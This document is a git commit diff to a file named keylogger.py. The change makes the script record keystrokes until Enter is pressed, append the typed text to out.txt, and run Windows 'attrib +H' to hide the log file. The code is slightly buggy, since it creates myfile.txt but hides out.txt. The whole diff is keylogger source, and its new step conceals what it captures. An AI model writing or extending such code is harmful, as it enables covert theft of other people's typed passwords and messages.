cc83271679b256a7e69fe6d464d1377fa757b511
kun99 <kuns.km@gmail.com>
2023-10-07 13:14:57 +0700

    File is created and hidden if it doesn't exist

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,18 @@
 import keyboard
+import subprocess
 
-recorded_keys = keyboard.record('a')
-string_ver = keyboard.get_typed_strings(recorded_keys)
-f = open("./out.txt", "w")
-for i in string_ver:
-    f.write(i)
-f.close()
+def create_file():
+    f = open("myfile.txt", "x")
+    subprocess.check_call(["attrib","+H","out.txt"])
+    f.close()
+
+try:
+    recorded_keys = keyboard.record('Enter')
+    string_ver = keyboard.get_typed_strings(recorded_keys)
+    f = open("./out.txt", "a")
+    for i in string_ver:
+        f.write(i)
+    f.close()
+
+except IOError:
+    create_file()
